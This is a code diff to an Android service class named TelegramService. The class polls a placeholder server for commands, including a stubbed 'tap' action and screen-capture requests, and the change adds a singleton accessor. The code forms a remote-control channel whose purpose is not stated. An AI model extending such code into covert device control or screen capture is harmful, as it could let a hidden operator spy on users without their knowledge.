@@ -6,18 +6,28 @@ import android.os.IBinder;
 
 public class TelegramService extends Service {
 
+    private static TelegramService instance;
     private HttpPollingEngine engine;
+
+    public static TelegramService getInstance() {
+        return instance;
+    }
+
+    public HttpPollingEngine getEngine() {
+        return engine;
+    }
 
     @Override
     public void onCreate() {
         super.onCreate();
+        instance = this;
 
         engine = new HttpPollingEngine(
                 "http://YOUR_SERVER_URL",
 
                 command -> {
                     if ("tap".equals(command.action)) {
-                        // обработка тапа
+                        // TODO: обработка тапа
                     }
                 },
 
@@ -25,19 +35,17 @@ public class TelegramService extends Service {
                     ScreenCaptureRequestActivity.request(this, commandId);
                 },
 
-                commandId -> {
-                    // можно оставить пустым
-                }
+                commandId -> {}
         );
 
         ScreenCaptureRequestActivity.setEngine(engine);
-
         engine.start();
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
+        instance = null;
         if (engine != null) engine.stop();
     }
 
